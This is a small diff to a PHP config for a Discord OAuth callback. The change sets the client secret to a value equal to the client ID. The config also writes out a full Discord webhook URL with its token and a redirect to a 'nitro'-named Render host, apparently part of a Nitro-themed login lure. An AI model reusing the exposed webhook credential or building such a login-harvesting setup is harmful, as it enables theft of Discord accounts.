@@ -1,7 +1,7 @@
 <?php
 // ---- KONFİG BAŞLANGIÇ ----
 $client_id = "1518198703305785384";  // SENİN CLIENT ID'N
-$client_secret = "GİZLİ"; // KENDİ CLIENT SECRET'İNİ YAZ
+$client_secret = "1518198703305785384"; // KENDİ CLIENT SECRET'İNİ YAZ
 $redirect_uri = "https://nitro-4.onrender.com/discord_callback.php";
 $webhook = "https://discord.com/api/webhooks/1518189732692103198/bsr3VNCIFgM-yQbOekAfBjYJ5acWdrmmrhnXNHRjko93yJ0bicj9Vzg9GC0d4Y8KwZ8A";
 
